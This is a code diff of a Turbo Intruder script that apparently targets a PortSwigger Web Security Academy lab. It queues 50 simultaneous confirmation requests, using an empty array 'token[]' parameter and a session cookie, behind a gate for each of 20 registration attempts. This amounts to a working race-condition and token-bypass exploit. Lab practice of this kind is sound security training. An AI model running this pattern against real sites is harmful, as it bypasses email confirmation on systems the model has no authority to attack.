@@ -5,17 +5,23 @@ def queueRequests(target, wordlists):
                             engine=Engine.BURP2
                             )
     
+    token_req = '''POST /confirm?token[]= HTTP/2
+Host: 0aa400630352a7a7804c44420040003a.web-security-academy.net
+Cookie: phpsessionid=yPvtc5Q1o41RYihUGBETOIrqSeZLrLK2
+Content-Length: 0
+
+'''
+
 
     for i in range(20):
         username = "test" + str(i)        
         engine.queue(target.req, username, gate=str(i))
         
-        # queue 50 confirmation requests - note that this will probably sent in two separate packets
-        for i in range(50):
-            engine.queue(confirmationReq, gate=currentAttempt)
-        
-        # send all the queued requests for this attempt
-        engine.openGate(currentAttempt)
+        for j in range(50):
+            engine.queue(token_req, gate=str(i))
+            
+         
+        engine.openGate(str(i))
 
 def handleResponse(req, interesting):
     table.add(req)
